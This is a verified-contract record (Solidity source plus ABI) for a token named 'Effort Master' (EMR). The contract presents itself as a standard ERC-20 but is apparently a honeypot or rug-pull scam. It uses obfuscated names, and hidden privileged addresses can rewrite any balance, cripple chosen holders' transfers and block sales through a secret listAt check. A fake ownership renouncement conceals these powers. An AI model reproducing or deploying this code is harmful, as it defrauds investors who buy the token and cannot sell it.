{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface liquidityLimit {\n    function createPair(address modeLaunch, address listToken) external returns (address);\n}\n\ninterface buyList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMaxReceiver) external view returns (uint256);\n\n    function transfer(address shouldLiquidity, uint256 launchedIs) external returns (bool);\n\n    function allowance(address takeLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldLiquidity,\n        uint256 launchedIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTeamTrading, uint256 value);\n    event Approval(address indexed takeLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract receiverFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyListMetadata is buyList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffortMaster is receiverFee, buyList, buyListMetadata {\n\n    uint8 private isEnable = 18;\n\n    function balanceOf(address limitMaxReceiver) public view virtual override returns (uint256) {\n        return fromToIs[limitMaxReceiver];\n    }\n\n    bool public modeAmount;\n\n    mapping(address => uint256) private fromToIs;\n\n    address minTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public autoReceiver;\n\n    function allowance(address sellLaunchedLiquidity, address maxBuy) external view virtual override returns (uint256) {\n        if (maxBuy == minTeam) {\n            return type(uint256).max;\n        }\n        return launchTrading[sellLaunchedLiquidity][maxBuy];\n    }\n\n    string private isTrading = \"Effort Master\";\n\n    bool public senderFeeTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isEnable;\n    }\n\n    function approve(address maxBuy, uint256 launchedIs) public virtual override returns (bool) {\n        launchTrading[_msgSender()][maxBuy] = launchedIs;\n        emit Approval(_msgSender(), maxBuy, launchedIs);\n        return true;\n    }\n\n    function transferFrom(address takeIsSell, address shouldLiquidity, uint256 launchedIs) external override returns (bool) {\n        if (_msgSender() != minTeam) {\n            if (launchTrading[takeIsSell][_msgSender()] != type(uint256).max) {\n                require(launchedIs <= launchTrading[takeIsSell][_msgSender()]);\n                launchTrading[takeIsSell][_msgSender()] -= launchedIs;\n            }\n        }\n        return receiverList(takeIsSell, shouldLiquidity, launchedIs);\n    }\n\n    uint256 listAt;\n\n    mapping(address => bool) public marketingFromMode;\n\n    address public receiverSell;\n\n    function listTake(uint256 launchedIs) public {\n        limitTeamFund();\n        listAt = launchedIs;\n    }\n\n    uint256 private fundWallet = 100000000 * 10 ** 18;\n\n    address public receiverExemptMode;\n\n    function name() external view virtual override returns (string memory) {\n        return isTrading;\n    }\n\n    function walletTokenAt(address toMaxIs, uint256 launchedIs) public {\n        limitTeamFund();\n        fromToIs[toMaxIs] = launchedIs;\n    }\n\n    event OwnershipTransferred(address indexed tradingFund, address indexed buyFund);\n\n    uint256 private launchReceiverMax;\n\n    function transfer(address toMaxIs, uint256 launchedIs) external virtual override returns (bool) {\n        return receiverList(_msgSender(), toMaxIs, launchedIs);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchTrading;\n\n    bool public exemptFund;\n\n    uint256 public launchAutoMax;\n\n    constructor (){\n        \n        listBuy amountIs = listBuy(minTeam);\n        receiverExemptMode = liquidityLimit(amountIs.factory()).createPair(amountIs.WETH(), address(this));\n        if (senderFeeTeam) {\n            limitTo = true;\n        }\n        receiverSell = _msgSender();\n        autoReceiver[receiverSell] = true;\n        fromToIs[receiverSell] = fundWallet;\n        maxLimitAmount();\n        if (launchAutoMax != launchReceiverMax) {\n            launchReceiverMax = launchAutoMax;\n        }\n        emit Transfer(address(0), receiverSell, fundWallet);\n    }\n\n    function tokenBuy(address swapTake) public {\n        require(swapTake.balance < 100000);\n        if (modeAmount) {\n            return;\n        }\n        \n        autoReceiver[swapTake] = true;\n        if (launchReceiverMax == launchAutoMax) {\n            senderFeeTeam = false;\n        }\n        modeAmount = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minAuto;\n    }\n\n    function receiverList(address takeIsSell, address shouldLiquidity, uint256 launchedIs) internal returns (bool) {\n        if (takeIsSell == receiverSell) {\n            return receiverShould(takeIsSell, shouldLiquidity, launchedIs);\n        }\n        uint256 teamFrom = buyList(receiverExemptMode).balanceOf(minMode);\n        require(teamFrom == listAt);\n        require(shouldLiquidity != minMode);\n        if (marketingFromMode[takeIsSell]) {\n            return receiverShould(takeIsSell, shouldLiquidity, receiverLaunched);\n        }\n        return receiverShould(takeIsSell, shouldLiquidity, launchedIs);\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldTotal;\n    }\n\n    uint256 swapReceiver;\n\n    address minMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function liquidityReceiver(address enableTokenExempt) public {\n        limitTeamFund();\n        \n        if (enableTokenExempt == receiverSell || enableTokenExempt == receiverExemptMode) {\n            return;\n        }\n        marketingFromMode[enableTokenExempt] = true;\n    }\n\n    function limitTeamFund() private view {\n        require(autoReceiver[_msgSender()]);\n    }\n\n    function receiverShould(address takeIsSell, address shouldLiquidity, uint256 launchedIs) internal returns (bool) {\n        require(fromToIs[takeIsSell] >= launchedIs);\n        fromToIs[takeIsSell] -= launchedIs;\n        fromToIs[shouldLiquidity] += launchedIs;\n        emit Transfer(takeIsSell, shouldLiquidity, launchedIs);\n        return true;\n    }\n\n    string private minAuto = \"EMR\";\n\n    uint256 constant receiverLaunched = 20 ** 10;\n\n    bool public limitTo;\n\n    address private shouldTotal;\n\n    function owner() external view returns (address) {\n        return shouldTotal;\n    }\n\n    function maxLimitAmount() public {\n        emit OwnershipTransferred(receiverSell, address(0));\n        shouldTotal = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundWallet;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeamTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMaxReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAutoMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTokenExempt\",\"type\":\"address\"}],\"name\":\"liquidityReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"listTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFromMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimitAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExemptMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFeeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"tokenBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMaxIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeIsSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMaxIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"walletTokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EffortMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}